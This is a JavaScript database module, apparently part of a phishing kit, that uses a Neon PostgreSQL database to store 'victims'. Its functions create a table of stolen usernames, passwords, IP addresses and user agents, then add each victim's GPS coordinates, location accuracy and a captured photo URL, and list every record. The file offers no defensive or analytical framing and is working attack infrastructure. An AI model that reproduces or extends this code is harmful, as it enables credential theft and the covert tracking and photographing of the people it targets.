// lib/db.js — PostgreSQL connection via Neon
import { neon } from '@neondatabase/serverless';

let sql = null;

function getSql() {
  if (!sql && process.env.DATABASE_URL) {
    sql = neon(process.env.DATABASE_URL);
  }
  return sql;
}

export async function initDB() {
  const s = getSql();
  if (!s) {
    console.warn('[DB] No DATABASE_URL configured, skipping DB init');
    return;
  }
  try {
    await s(`
      CREATE TABLE IF NOT EXISTS victims (
        id SERIAL PRIMARY KEY,
        ip_address VARCHAR(45),
        user_agent TEXT,
        username VARCHAR(255),
        password VARCHAR(255),
        latitude DECIMAL(10, 8),
        longitude DECIMAL(11, 8),
        location_accuracy DECIMAL(10, 2),
        photo_url TEXT,
        captured_at TIMESTAMPTZ DEFAULT NOW()
      );
    `);
    console.log('[DB] Table initialized');
  } catch (e) {
    console.error('[DB] Init error:', e.message);
  }
}

export async function saveCredentials(username, password, ip, ua) {
  const s = getSql();
  if (!s) return null;
  try {
    const result = await s`
      INSERT INTO victims (ip_address, user_agent, username, password)
      VALUES (${ip}, ${ua}, ${username}, ${password})
      RETURNING id;
    `;
    return result[0]?.id;
  } catch (e) {
    console.error('[DB] saveCredentials error:', e.message);
    return null;
  }
}

export async function updateCapture(id, lat, lng, accuracy, photoUrl) {
  const s = getSql();
  if (!s) return;
  try {
    await s`
      UPDATE victims
      SET latitude = ${lat}, longitude = ${lng}, 
          location_accuracy = ${accuracy}, photo_url = ${photoUrl}
      WHERE id = ${id};
    `;
  } catch (e) {
    console.error('[DB] updateCapture error:', e.message);
  }
}

export async function getAllVictims() {
  const s = getSql();
  if (!s) return [];
  try {
    return await s`SELECT * FROM victims ORDER BY captured_at DESC;`;
  } catch (e) {
    console.error('[DB] getAllVictims error:', e.message);
    return [];
  }
}
